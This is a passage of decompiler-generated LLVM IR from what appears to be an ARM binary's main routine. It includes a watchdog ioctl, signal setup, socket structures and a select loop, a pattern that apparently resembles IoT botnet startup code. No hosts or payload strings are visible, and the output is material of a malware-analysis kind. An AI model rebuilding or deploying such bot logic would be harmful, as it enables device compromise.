  %tmp13 = call i8 @__decompiler_undefined_function_1()
  %tmp19 = call i8 @__decompiler_undefined_function_1()
  %tmp23 = call i8 @__decompiler_undefined_function_1()
  %tmp27 = call i8 @__decompiler_undefined_function_1()
  %tmp31 = call i8 @__decompiler_undefined_function_1()
  %tmp34 = call i8 @__decompiler_undefined_function_1()
  %tmp35 = call i8 @__decompiler_undefined_function_1()
  %tmp37 = call i8 @__decompiler_undefined_function_1()
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-1616 = alloca i32, align 4
  %stack_var_-38 = alloca i8, align 1
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-592 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-170 = alloca i32, align 4
  %stack_var_-138 = alloca i32, align 4
  %stack_var_-72 = alloca i8, align 1
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-106 = alloca i8, align 1
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-464 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_f460 = load i32, i32* @r4, align 4
  store i32 %v3_f460, i32* %stack_var_-36, align 4
  %v6_f460 = load i32, i32* @r5, align 4
  %v15_f460 = load i32, i32* @r8, align 4
  %v2_f470 = ptrtoint i32* %stack_var_-464 to i32
  store i32 %v2_f470, i32* @r4, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_f478 = load i32, i32* %arg2, align 4
  store i32 %tmp, i32* @r6, align 4
  %v1_f480 = inttoptr i32 %v2_f478 to i8*
  %v2_f480 = call i32 @function_13950(i8* %v1_f480)
  store i32 %v2_f470, i32* @r0, align 4
  %v1_f488 = call i32 @function_13fc4(i32 %v2_f470)
  store i32 %v2_f470, i32* @r0, align 4
  %v2_f494 = call i32 @function_13f94(i32 %v2_f470, i32 2)
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_f4a4 = bitcast i32* %stack_var_-464 to %_TYPEDEF_sigset_t*
  %v4_f4a4 = call i32 @function_138d0(i32 0, %_TYPEDEF_sigset_t* %v3_f4a4, i32 0)
  %v2_f4b0 = call i32 @function_13fdc(i32 17, i32 1)
  %v2_f4bc = call i32 @function_13fdc(i32 5, i32 ptrtoint (i32* @global_var_f248.121 to i32))
  %v4_f4c8 = call i32 @function_13780(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_15f70.123, i32 0, i32 0), i32 2)
  %v7_f4cc = icmp eq i32 %v4_f4c8, -1
  store i32 %v4_f4c8, i32* @r4, align 4
  br i1 %v7_f4cc, label %dec_label_pc_f850, label %dec_label_pc_f4d8

dec_label_pc_f4d8:                                ; preds = %dec_label_pc_f850, %dec_label_pc_f460
  %v0_f4ec = phi i32 [ %v4_f858, %dec_label_pc_f850 ], [ %v4_f4c8, %dec_label_pc_f460 ]
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_f4f0 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_f4f0, i32* %r2.global-to-local, align 4
  store i32 1, i32* %stack_var_-48, align 4
  %v5_f4f8 = call i32 @function_13704(i32 %v0_f4ec, i32 -2147199228, i32 %v2_f4f0, i32 1, i32 1)
  %v0_f4fc = load i32, i32* @r4, align 4
  %v1_f500 = call i32 @function_13654(i32 %v0_f4fc)
  br label %dec_label_pc_f504

dec_label_pc_f504:                                ; preds = %dec_label_pc_f850, %dec_label_pc_f4d8
  %v2_f508 = call i32 @function_13628(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_15f20.23, i32 0, i32 0))
  %v0_f50c = call i32 @function_12f4c()
  store i32 ptrtoint (i32* @global_var_1ec7c.86 to i32), i32* @fp, align 4
  store i32 ptrtoint (i8** @global_var_1ec88.116 to i32), i32* @lr, align 4
  store i32 0, i32* @r4, align 4
  store i32 80, i32* %r3.global-to-local, align 4
  %v2_f528 = ptrtoint i8* %stack_var_-106 to i32
  store i32 2, i32* @r7, align 4
  store i8 80, i8* bitcast (i32* @global_var_1ec8b.118 to i8*), align 4
  store i32 902487617, i32* @global_var_1ec8c.117, align 4
  store i8 0, i8* bitcast (i32* @global_var_1ec8a.119 to i8*), align 4
  store i8 0, i8* bitcast (i32* @global_var_1ec89.128 to i8*), align 4
  store i32 %v0_f50c, i32* @global_var_1ec7c.86, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15fc4.130 to i32), i32* @r1, align 4
  store i32 18, i32* @r2, align 4
  store i8 2, i8* bitcast (i8** @global_var_1ec88.116 to i8*), align 4
  store i32 %v2_f528, i32* @r0, align 4
  %v0_f554 = load i32, i32* @r6, align 4
  %v1_f554 = inttoptr i32 %v0_f554 to i32*
  %v2_f554 = load i32, i32* %v1_f554, align 4
  store i32 %v2_f554, i32* @r5, align 4
  %v4_f558 = call i32 @function_13c70(i32 %v2_f528, i32 ptrtoint ([3 x i8]* @global_var_15fc4.130 to i32), i32 18)
  store i32 ptrtoint (i32* @global_var_15fc0.145 to i32), i32* @r4, align 4
  %v13_f578 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v13_f578, i32* @lr, align 4
  store i32 add (i32 add (i32 ptrtoint (i32* @global_var_122b4.140 to i32), i32 add (i32 add (i32 add (i32 ptrtoint (i32* @global_var_f260.133 to i32), i32 ptrtoint (i32* @global_var_1236c.135 to i32)), i32 74376), i32 ptrtoint (i32* @global_var_12424.138 to i32))), i32 155012), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_f248.121 to i32), i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_f248.121 to i32), i32* %stack_var_-176, align 4
  br i1 icmp eq (i32 add (i32 add (i32 ptrtoint (i32* @global_var_122b4.140 to i32), i32 add (i32 add (i32 add (i32 ptrtoint (i32* @global_var_f260.133 to i32), i32 ptrtoint (i32* @global_var_1236c.135 to i32)), i32 74376), i32 ptrtoint (i32* @global_var_12424.138 to i32))), i32 155012), i32 0), label %dec_label_pc_f754, label %dec_label_pc_f5c0

dec_label_pc_f5c0:                                ; preds = %dec_label_pc_f504
  %v3_f5c0 = load i8, i8* %stack_var_-106, align 1
  %v4_f5c0 = sext i8 %v3_f5c0 to i32
  store i32 %v4_f5c0, i32* %r2.global-to-local, align 4
  %v4_f5c4 = zext i8 %tmp37 to i32
  store i32 %v4_f5c4, i32* %r3.global-to-local, align 4
  %v0_f5c8 = load i32, i32* @r5, align 4
  store i8 %tmp37, i8* %stack_var_-72, align 1
  %v1_f5d4 = inttoptr i32 %v0_f5c8 to i8*
  %v2_f5d4 = call i32 @function_12c94(i8* %v1_f5d4)
  %v0_f5dc = load i32, i32* @r7, align 4
  %v2_f5e0 = call i32 @function_1347c(i32 %v0_f5dc, i32 %v2_f5d4)
  %v4_f5e4 = zext i8 %tmp35 to i32
  store i32 %v4_f5e4, i32* %r2.global-to-local, align 4
  %v4_f5e8 = zext i8 %tmp34 to i32
  store i32 %v4_f5e8, i32* %r3.global-to-local, align 4
  %v0_f5ec = load i32, i32* @r5, align 4
  %v2_f5ec = add i32 %v0_f5ec, %v2_f5e0
  %v3_f5ec = inttoptr i32 %v2_f5ec to i8*
  %v4_f5ec = load i8, i8* %v3_f5ec, align 1
  %v6_f5ec = zext i8 %v4_f5ec to i32
  store i32 %v6_f5ec, i32* %r4.global-to-local, align 4
  %v1_f5fc = inttoptr i32 %v0_f5ec to i8*
  %v2_f5fc = call i32 @function_12c94(i8* %v1_f5fc)
  %v2_f608 = call i32 @function_1347c(i32 4, i32 %v2_f5fc)
  %v1_f60c = sub nuw nsw i32 -1, %v6_f5ec
  store i32 %v1_f60c, i32* %r4.global-to-local, align 4
  %v0_f610 = load i32, i32* @r5, align 4
  %v2_f610 = add i32 %v0_f610, %v2_f608
  %v3_f610 = inttoptr i32 %v2_f610 to i8*
  %v4_f610 = load i8, i8* %v3_f610, align 1
  %v6_f610 = zext i8 %v4_f610 to i32
  %v4_f614 = zext i8 %tmp31 to i32
  store i32 %v4_f614, i32* %r2.global-to-local, align 4
  %v1_f61c = sub nuw nsw i32 -82, %v6_f5ec
  %v1_f620 = sub nuw nsw i32 -1, %v6_f610
  store i32 %v1_f620, i32* %r3.global-to-local, align 4
  %v1_f628 = urem i32 %v1_f61c, 256
  %v2_f62c = add nsw i32 %v1_f628, %v1_f620
  store i32 %v2_f62c, i32* %r4.global-to-local, align 4
  %v1_f638 = inttoptr i32 %v0_f610 to i8*
  %v2_f638 = call i32 @function_12c94(i8* %v1_f638)
  %v2_f644 = call i32 @function_1347c(i32 6, i32 %v2_f638)
  %v0_f648 = load i32, i32* @r5, align 4
  %v2_f648 = add i32 %v0_f648, %v2_f644
  %v3_f648 = inttoptr i32 %v2_f648 to i8*
  %v4_f648 = load i8, i8* %v3_f648, align 1
  %v6_f648 = zext i8 %v4_f648 to i32
  %v4_f64c = zext i8 %tmp27 to i32
  store i32 %v4_f64c, i32* %r2.global-to-local, align 4
  %v1_f654 = sub nuw nsw i32 -1, %v6_f648
  store i32 %v1_f654, i32* %r3.global-to-local, align 4
  %v0_f65c = load i32, i32* %r4.global-to-local, align 4
  %v1_f65c = urem i32 %v0_f65c, 256
  %v2_f660 = add nsw i32 %v1_f65c, %v1_f654
  store i32 %v2_f660, i32* %r4.global-to-local, align 4
  %v1_f66c = inttoptr i32 %v0_f648 to i8*
  %v2_f66c = call i32 @function_12c94(i8* %v1_f66c)
  %v2_f678 = call i32 @function_1347c(i32 8, i32 %v2_f66c)
  %v0_f67c = load i32, i32* @r5, align 4
  %v2_f67c = add i32 %v0_f67c, %v2_f678
  %v3_f67c = inttoptr i32 %v2_f67c to i8*
  %v4_f67c = load i8, i8* %v3_f67c, align 1
  %v6_f67c = zext i8 %v4_f67c to i32
  %v4_f680 = zext i8 %tmp23 to i32
  store i32 %v4_f680, i32* %r2.global-to-local, align 4
  %v1_f688 = sub nuw nsw i32 -1, %v6_f67c
  store i32 %v1_f688, i32* %r3.global-to-local, align 4
  %v0_f690 = load i32, i32* %r4.global-to-local, align 4
  %v1_f690 = urem i32 %v0_f690, 256
  %v2_f694 = add nsw i32 %v1_f690, %v1_f688
  store i32 %v2_f694, i32* %r4.global-to-local, align 4
  %v1_f6a0 = inttoptr i32 %v0_f67c to i8*
  %v2_f6a0 = call i32 @function_12c94(i8* %v1_f6a0)
  %v2_f6ac = call i32 @function_1347c(i32 10, i32 %v2_f6a0)
  %v0_f6b0 = load i32, i32* @r5, align 4
  %v2_f6b0 = add i32 %v0_f6b0, %v2_f6ac
  %v3_f6b0 = inttoptr i32 %v2_f6b0 to i8*
  %v4_f6b0 = load i8, i8* %v3_f6b0, align 1
  %v6_f6b0 = zext i8 %v4_f6b0 to i32
  %v4_f6b4 = zext i8 %tmp19 to i32
  store i32 %v4_f6b4, i32* %r2.global-to-local, align 4
  %v1_f6bc = sub nuw nsw i32 -1, %v6_f6b0
  store i32 %v1_f6bc, i32* %r3.global-to-local, align 4
  %v0_f6c4 = load i32, i32* %r4.global-to-local, align 4
  %v1_f6c4 = urem i32 %v0_f6c4, 256
  %v2_f6c8 = add nsw i32 %v1_f6c4, %v1_f6bc
  store i32 %v2_f6c8, i32* %r4.global-to-local, align 4
  %v1_f6d4 = inttoptr i32 %v0_f6b0 to i8*
  %v2_f6d4 = call i32 @function_12c94(i8* %v1_f6d4)
  %v2_f6e0 = call i32 @function_1347c(i32 12, i32 %v2_f6d4)
  %v0_f6e4 = load i32, i32* @r5, align 4
  %v2_f6e4 = add i32 %v0_f6e4, %v2_f6e0
  %v3_f6e4 = inttoptr i32 %v2_f6e4 to i8*
  %v4_f6e4 = load i8, i8* %v3_f6e4, align 1
  %v6_f6e4 = zext i8 %v4_f6e4 to i32
  %v0_f6e8 = load i32, i32* %r4.global-to-local, align 4
  %v1_f6e8 = urem i32 %v0_f6e8, 256
  %v1_f6ec = sub nuw nsw i32 -1, %v6_f6e4
  store i32 %v1_f6ec, i32* %r3.global-to-local, align 4
  %v2_f6f0 = add nsw i32 %v1_f6e8, %v1_f6ec
  store i32 %v2_f6f0, i32* %r4.global-to-local, align 4
  %fold = add i32 %v0_f6e8, %v1_f6ec
  %v1_f6f8 = urem i32 %fold, 256
  %v2_f6fc = call i32 @function_133b0(i32 %v1_f6f8, i32 9)
  %v1_f700 = load i32, i32* @r7, align 4
  %v6_f700 = shl i32 %v2_f6fc, %v1_f700
  %v2_f708 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_f708, i32* %r2.global-to-local, align 4
  %v1_f70c = and i32 %v6_f700, 1020
  %v2_f714 = add i32 %v1_f70c, %v2_f708
  %v2_f718 = ptrtoint i8* %stack_var_-72 to i32
  store i32 %v2_f718, i32* @r4, align 4
  store i32 63268, i32* @lr, align 4
  %v1_f720 = add i32 %v2_f714, -172
  %v2_f720 = inttoptr i32 %v1_f720 to i32*
  %v3_f720 = load i32, i32* %v2_f720, align 4
  call void @__pseudo_branch(i32 %v3_f720)
  %v0_f724 = load i32, i32* @r5, align 4
  %v2_f72c = inttoptr i32 %v0_f724 to i8*
  %v3_f72c = call i32 @function_13074(i8* %v2_f72c, i32 %v2_f718)
  store i32 %v3_f72c, i32* @r5, align 4
  %v2_f73c = call i32 @function_12d34(i32 %v2_f528, i32 18)
  %v2_f748 = call i32 @function_12d34(i32 %v2_f718, i32 12)
  %v0_f74c = load i32, i32* @r5, align 4
  %v1_f74c = urem i32 %v0_f74c, 256
  %v2_f74c = icmp eq i32 %v1_f74c, 0
  br i1 %v2_f74c, label %dec_label_pc_f754, label %dec_label_pc_f86c

dec_label_pc_f754:                                ; preds = %dec_label_pc_f5c0, %dec_label_pc_f504, %dec_label_pc_f86c
  %v2_f758 = ptrtoint i32* %stack_var_-138 to i32
  store i32 %v2_f758, i32* @sl, align 4
  %v0_f75c = call i32 @function_f260()
  %v1_f760 = call i32 @function_feb8(i32 %v0_f75c)
  %v2_f76c = call i32 @function_12d34(i32 %v2_f758, i32 32)
  %v0_f770 = load i32, i32* @r8, align 4
  %v7_f770 = icmp eq i32 %v0_f770, 2
  br i1 %v7_f770, label %dec_label_pc_f878, label %dec_label_pc_f778

dec_label_pc_f778:                                ; preds = %dec_label_pc_f878, %dec_label_pc_f754, %dec_label_pc_f888
  %v0_f778 = call i32 @function_fe60()
  %v1_f77c = mul i32 %v0_f778, 4
  %v3_f780 = and i32 %v1_f77c, 12
  %v2_f788 = ptrtoint i32* %stack_var_-170 to i32
  store i32 %v2_f788, i32* @r5, align 4
  %v1_f78c = add nuw nsw i32 %v3_f780, 12
  store i32 %v1_f78c, i32* @r4, align 4
  %v2_f798 = call i32 @function_ff14(i32 %v2_f788, i32 %v1_f78c)
  %v2_f7a0 = ptrtoint i32* %stack_var_-36 to i32
  %v1_f7a4 = load i32, i32* @r4, align 4
  %v2_f7a4 = add i32 %v1_f7a4, %v2_f7a0
  store i32 %v2_f7a4, i32* %r3.global-to-local, align 4
  %v0_f7a8 = load i32, i32* @r6, align 4
  %v1_f7a8 = inttoptr i32 %v0_f7a8 to i32*
  %v2_f7a8 = load i32, i32* %v1_f7a8, align 4
  store i32 %v2_f7a8, i32* @r0, align 4
  store i32 0, i32* @r6, align 4
  %v3_f7b0 = add i32 %v2_f7a4, -134
  %v4_f7b0 = inttoptr i32 %v3_f7b0 to i8*
  store i8 0, i8* %v4_f7b0, align 1
  %v2_f7b8 = inttoptr i32 %v2_f7a8 to i8*
  %v3_f7b8 = call i32 @function_12cbc(i8* %v2_f7b8, i32 %v2_f788)
  %v0_f7bc = call i32 @function_fe60()
  %v2_f7c4 = call i32 @function_133b0(i32 %v0_f7bc, i32 6)
  %v3_f7c8 = mul i32 %v2_f7c4, 4
  %v1_f7cc = add i32 %v3_f7c8, 12
  store i32 %v1_f7cc, i32* @r4, align 4
  %v2_f7d8 = call i32 @function_ff14(i32 %v2_f788, i32 %v1_f7cc)
  store i32 %v2_f7a0, i32* %r2.global-to-local, align 4
  %v1_f7e4 = load i32, i32* @r4, align 4
  %v2_f7e4 = add i32 %v1_f7e4, %v2_f7a0
  store i32 %v2_f7e4, i32* %r3.global-to-local, align 4
  %v0_f7e8 = load i32, i32* @r6, align 4
  %v1_f7e8 = trunc i32 %v0_f7e8 to i8
  %v3_f7e8 = add i32 %v2_f7e4, -134
  %v4_f7e8 = inttoptr i32 %v3_f7e8 to i8*
  store i8 %v1_f7e8, i8* %v4_f7e8, align 1
  %v4_f7f4 = call i32 @function_137ec(i32 15, i32 %v2_f788, i32 %v2_f7a0, i32 %v2_f7e4)
  %v1_f7fc = call i32 @function_1236c(i32 2)
  %v3_f808 = call i32 @function_12288(i32 2, i32* nonnull %stack_var_-44)
  %v3_f80c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_f80c, i32* %r2.global-to-local, align 4
  %v3_f818 = inttoptr i32 %v3_f808 to i32*
  %v4_f818 = call i32 @function_1397c(i32 1, i32* %v3_f818, i32 %v3_f80c)
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_f828 = call i32 @function_1397c(i32 1, i32* nonnull @global_var_15f94.147, i32 1)
  %v1_f830 = call i32 @function_122b4(i32 2)
  %v0_f834 = call i32 @function_13680()
  %v1_f838 = load i32, i32* @r6, align 4
  %v7_f83c = icmp sgt i32 %v0_f834, %v1_f838
  br i1 %v7_f83c, label %dec_label_pc_f840, label %dec_label_pc_f8b0

dec_label_pc_f840:                                ; preds = %dec_label_pc_f778
  %v2_f84c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_f84c, i32* %r4.global-to-local, align 4
  store i32 %v6_f460, i32* %r5.global-to-local, align 4
  store i32 %v15_f460, i32* %r8.global-to-local, align 4
  ret i32 0

dec_label_pc_f850:                                ; preds = %dec_label_pc_f460
  %v4_f858 = call i32 @function_13780(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_15f80.149, i32 0, i32 0), i32 2)
  %v3_f85c = icmp eq i32 %v4_f858, -1
  store i32 %v4_f858, i32* @r4, align 4
  br i1 %v3_f85c, label %dec_label_pc_f504, label %dec_label_pc_f4d8

dec_label_pc_f86c:                                ; preds = %dec_label_pc_f5c0
  %v1_f870 = call i32 @function_13f7c(i32 5)
  br label %dec_label_pc_f754

dec_label_pc_f878:                                ; preds = %dec_label_pc_f754
  %v0_f878 = load i32, i32* @r6, align 4
  %v1_f878 = add i32 %v0_f878, 4
  %v2_f878 = inttoptr i32 %v1_f878 to i32*
  %v3_f878 = load i32, i32* %v2_f878, align 4
  %v1_f87c = inttoptr i32 %v3_f878 to i8*
  %v2_f87c = call i32 @function_12c94(i8* %v1_f87c)
  %v8_f884 = icmp sgt i32 %v2_f87c, 31
  br i1 %v8_f884, label %dec_label_pc_f778, label %dec_label_pc_f888

dec_label_pc_f888:                                ; preds = %dec_label_pc_f878
  %v0_f888 = load i32, i32* @r6, align 4
  %v1_f888 = add i32 %v0_f888, 4
  %v2_f888 = inttoptr i32 %v1_f888 to i32*
  %v3_f888 = load i32, i32* %v2_f888, align 4
  store i32 %v2_f758, i32* @r0, align 4
  %v2_f890 = bitcast i32* %stack_var_-138 to i8*
  %v3_f890 = call i32 @function_12cbc(i8* %v2_f890, i32 %v3_f888)
  %v0_f894 = load i32, i32* @r6, align 4
  %v1_f894 = add i32 %v0_f894, 4
  %v2_f894 = inttoptr i32 %v1_f894 to i32*
  %v3_f894 = load i32, i32* %v2_f894, align 4
  store i32 %v3_f894, i32* %r4.global-to-local, align 4
  %v1_f89c = inttoptr i32 %v3_f894 to i8*
  %v2_f89c = call i32 @function_12c94(i8* %v1_f89c)
  %v2_f8a8 = call i32 @function_12d34(i32 %v3_f894, i32 %v2_f89c)
  br label %dec_label_pc_f778

dec_label_pc_f8b0:                                ; preds = %dec_label_pc_f778
  %v1_f8b0 = call i32 @function_138a4(i32 %v0_f834)
  %v0_f8b8 = load i32, i32* @r6, align 4
  %v1_f8bc = call i32 @function_13654(i32 %v0_f8b8)
  %v1_f8c4 = call i32 @function_13654(i32 1)
  %v1_f8cc = call i32 @function_13654(i32 2)
  %v2_f8d0 = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_f8d0, i32* @r7, align 4
  %v1_f8d4 = call i32 @function_a558(i32 %v1_f8cc)
  store i32 ptrtoint (i32* @global_var_1ea50.151 to i32), i32* @sb, align 4
  %v1_f8dc = call i32 @function_eab0(i32 %v1_f8d4)
  %v0_f8e0 = call i32 @function_1091c()
  %v0_f8e4 = load i32, i32* @r6, align 4
  %v2_f8ec = ptrtoint i32* %stack_var_-592 to i32
  store i32 %v2_f8ec, i32* @r6, align 4
  %v2_f8f0 = ptrtoint i32* %stack_var_-336 to i32
  store i32 %v2_f8f0, i32* @r7, align 4
  %v2_f9d0 = ptrtoint i32* %stack_var_-60 to i32
  %v5_fc8c = bitcast i8* %stack_var_-38 to i32*
  %v2_fbb4 = ptrtoint i32* %stack_var_-1616 to i32
  %v2_fca4 = ptrtoint i32* %stack_var_-48 to i32
  %v2_fca8 = ptrtoint i32* %stack_var_-52 to i32
  %v1_fd38 = bitcast i32* %stack_var_-138 to i8*
  %v5_fd0c = bitcast i32* %stack_var_-88 to %sockaddr*
  %v1_fd24 = sub i32 0, %v1_f8b0
  br label %dec_label_pc_f8f4

dec_label_pc_f8f4:                                ; preds = %dec_label_pc_f8f4.backedge, %dec_label_pc_f8b0
  %v2_f8fc87 = phi i32 [ %v2_f8ec, %dec_label_pc_f8b0 ], [ %v2_f8fc87.pre, %dec_label_pc_f8f4.backedge ]
  %stack_var_-37.0 = phi i8 [ %tmp13, %dec_label_pc_f8b0 ], [ %stack_var_-37.0.be, %dec_label_pc_f8f4.backedge ]
  %stack_var_-1620.0 = phi i32 [ %v0_f8e4, %dec_label_pc_f8b0 ], [ %stack_var_-1620.0.be, %dec_label_pc_f8f4.backedge ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v4_f8fc89 = inttoptr i32 %v2_f8fc87 to i32*
  store i32 0, i32* %v4_f8fc89, align 4
  %v0_f90090 = load i32, i32* %r3.global-to-local, align 4
  %v1_f90091 = add i32 %v0_f90090, 4
  store i32 %v1_f90091, i32* %r3.global-to-local, align 4
  %v7_f90492 = icmp eq i32 %v1_f90091, 128
  br i1 %v7_f90492, label %dec_label_pc_f90c, label %dec_label_pc_f8fc.dec_label_pc_f8fc_crit_edge

dec_label_pc_f8fc.dec_label_pc_f8fc_crit_edge:    ; preds = %dec_label_pc_f8f4, %dec_label_pc_f8fc.dec_label_pc_f8fc_crit_edge
  %v1_f90093 = phi i32 [ %v1_f900, %dec_label_pc_f8fc.dec_label_pc_f8fc_crit_edge ], [ %v1_f90091, %dec_label_pc_f8f4 ]
  %v0_f8fc.pre = load i32, i32* %r2.global-to-local, align 4
  %v2_f8fc = load i32, i32* @r6, align 4
  %v3_f8fc = add i32 %v2_f8fc, %v1_f90093
  %v4_f8fc = inttoptr i32 %v3_f8fc to i32*
  store i32 %v0_f8fc.pre, i32* %v4_f8fc, align 4
  %v0_f900 = load i32, i32* %r3.global-to-local, align 4
  %v1_f900 = add i32 %v0_f900, 4
  store i32 %v1_f900, i32* %r3.global-to-local, align 4
  %v7_f904 = icmp eq i32 %v1_f900, 128
  br i1 %v7_f904, label %dec_label_pc_f90c, label %dec_label_pc_f8fc.dec_label_pc_f8fc_crit_edge

dec_label_pc_f90c:                                ; preds = %dec_label_pc_f8fc.dec_label_pc_f8fc_crit_edge, %dec_label_pc_f8f4
  %v0_f90c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_f90c, i32* %r3.global-to-local, align 4
  store i32 %v0_f90c, i32* @r4, align 4
  %v2_f91494 = load i32, i32* @r7, align 4
  %v3_f91495 = add i32 %v2_f91494, %v0_f90c
  %v4_f91496 = inttoptr i32 %v3_f91495 to i32*
  store i32 %v0_f90c, i32* %v4_f91496, align 4
  %v0_f91897 = load i32, i32* %r3.global-to-local, align 4
  %v1_f91898 = add i32 %v0_f91897, 4
  store i32 %v1_f91898, i32* %r3.global-to-local, align 4
  %v7_f91c99 = icmp eq i32 %v1_f91898, 128
  br i1 %v7_f91c99, label %dec_label_pc_f924, label %dec_label_pc_f914.dec_label_pc_f914_crit_edge

dec_label_pc_f914.dec_label_pc_f914_crit_edge:    ; preds = %dec_label_pc_f90c, %dec_label_pc_f914.dec_label_pc_f914_crit_edge
  %v1_f918100 = phi i32 [ %v1_f918, %dec_label_pc_f914.dec_label_pc_f914_crit_edge ], [ %v1_f91898, %dec_label_pc_f90c ]
  %v0_f914.pre = load i32, i32* @r4, align 4
  %v2_f914 = load i32, i32* @r7, align 4
  %v3_f914 = add i32 %v2_f914, %v1_f918100
  %v4_f914 = inttoptr i32 %v3_f914 to i32*
  store i32 %v0_f914.pre, i32* %v4_f914, align 4
  %v0_f918 = load i32, i32* %r3.global-to-local, align 4
  %v1_f918 = add i32 %v0_f918, 4
  store i32 %v1_f918, i32* %r3.global-to-local, align 4
  %v7_f91c = icmp eq i32 %v1_f918, 128
  br i1 %v7_f91c, label %dec_label_pc_f924, label %dec_label_pc_f914.dec_label_pc_f914_crit_edge

dec_label_pc_f924:                                ; preds = %dec_label_pc_f914.dec_label_pc_f914_crit_edge, %dec_label_pc_f90c
  store i32 ptrtoint (i32* @global_var_1ea4c.111 to i32), i32* %r3.global-to-local, align 4
  %v2_f928 = load i32, i32* @global_var_1ea4c.111, align 4
  %v7_f92c = icmp eq i32 %v2_f928, -1
  br i1 %v7_f92c, label %dec_label_pc_f95c, label %dec_label_pc_f934

dec_label_pc_f934:                                ; preds = %dec_label_pc_f924
  %v3_f934 = udiv i32 %v2_f928, 32
  %v3_f93c = mul nuw nsw i32 %v3_f934, 4
  %v2_f944 = add i32 %v3_f93c, %v2_f7a0
  store i32 %v2_f944, i32* %r3.global-to-local, align 4
  %v1_f948 = add i32 %v2_f944, -556
  %v2_f948 = inttoptr i32 %v1_f948 to i32*
  %v3_f948 = load i32, i32* %v2_f948, align 4
  %v1_f94c = urem i32 %v2_f928, 32
  %v7_f954 = shl i32 1, %v1_f94c
  %v8_f954 = or i32 %v3_f948, %v7_f954
  store i32 %v8_f954, i32* %r2.global-to-local, align 4
  store i32 %v8_f954, i32* %v2_f948, align 4
  br label %dec_label_pc_f95c

dec_label_pc_f95c:                                ; preds = %dec_label_pc_f924, %dec_label_pc_f934
  %v2_f95c = load i32, i32* @global_var_1ea50.151, align 4
  store i32 %v2_f95c, i32* %r3.global-to-local, align 4
  %v7_f960 = icmp eq i32 %v2_f95c, -1
  store i32 ptrtoint (i32* @global_var_1ea50.151 to i32), i32* %r8.global-to-local, align 4
  br i1 %v7_f960, label %dec_label_pc_fc04, label %dec_label_pc_f96c

dec_label_pc_f96c:                                ; preds = %dec_label_pc_f95c, %dec_label_pc_fc04, %.thread
  store i32 ptrtoint (i8** @global_var_1ebec.154 to i32), i32* %r2.global-to-local, align 4
  %v2_f970 = load i8, i8* bitcast (i8** @global_var_1ebec.154 to i8*), align 4
  %v3_f970 = zext i8 %v2_f970 to i32
  store i32 %v3_f970, i32* %r3.global-to-local, align 4
  %v2_f974 = icmp eq i8 %v2_f970, 0
  %v2_fac4 = load i32, i32* @global_var_1ea50.151, align 4
  %v3_facc = udiv i32 %v2_fac4, 32
  br i1 %v2_f974, label %dec_label_pc_fac4, label %dec_label_pc_f97c

dec_label_pc_f97c:                                ; preds = %dec_label_pc_f96c
  %v3_f988 = mul nuw nsw i32 %v3_facc, 4
  %v2_f990 = add i32 %v3_f988, %v2_f7a0
  store i32 %v2_f990, i32* %r3.global-to-local, align 4
  %v1_f994 = add i32 %v2_f990, -300
  %v2_f994 = inttoptr i32 %v1_f994 to i32*
  %v3_f994 = load i32, i32* %v2_f994, align 4
  %v1_f998 = urem i32 %v2_fac4, 32
  %v7_f9a0 = shl i32 1, %v1_f998
  %v8_f9a0 = or i32 %v3_f994, %v7_f9a0
  store i32 %v8_f9a0, i32* %r2.global-to-local, align 4
  store i32 %v8_f9a0, i32* %v2_f994, align 4
  br label %dec_label_pc_f9a8

dec_label_pc_f9a8:                                ; preds = %dec_label_pc_fac4, %dec_label_pc_f97c
  %v2_f9ac = load i32, i32* @global_var_1ea4c.111, align 4
  %v2_f9b0 = load i32, i32* @global_var_1ea50.151, align 4
  store i32 %v2_f9b0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  %v5_f9bc = icmp slt i32 %v2_f9ac, %v2_f9b0
  br i1 %v5_f9bc, label %bb, label %bb84

bb:                                               ; preds = %dec_label_pc_f9a8
  br label %bb84

bb84:                                             ; preds = %dec_label_pc_f9a8, %bb
  %v0_f9cc = phi i32 [ %v2_f9ac, %dec_label_pc_f9a8 ], [ %v2_f9b0, %bb ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 10, i32* %stack_var_-60, align 4
  %v1_f9cc = add i32 %v0_f9cc, 1
  store i32 %v2_f8f0, i32* %r2.global-to-local, align 4
  %v5_f9e4 = call i32 @function_13874(i32 %v1_f9cc, i32 %v2_f8ec, i32 %v2_f8f0, i32 0, i32 %v2_f9d0)
  %v8_f9e8 = icmp eq i32 %v5_f9e4, -1
  store i32 %v5_f9e4, i32* %r3.global-to-local, align 4
  br i1 %v8_f9e8, label %dec_label_pc_f8f4.backedge, label %dec_label_pc_f9f4

dec_label_pc_f9f4:                                ; preds = %bb84
  %v6_f9e4 = trunc i32 %v5_f9e4 to i8
  %v3_f9f4 = icmp eq i8 %v6_f9e4, 0
  br i1 %v3_f9f4, label %dec_label_pc_f9fc, label %dec_label_pc_fa24

dec_label_pc_f9fc:                                ; preds = %dec_label_pc_f9f4
  store i8 0, i8* %stack_var_-38, align 1
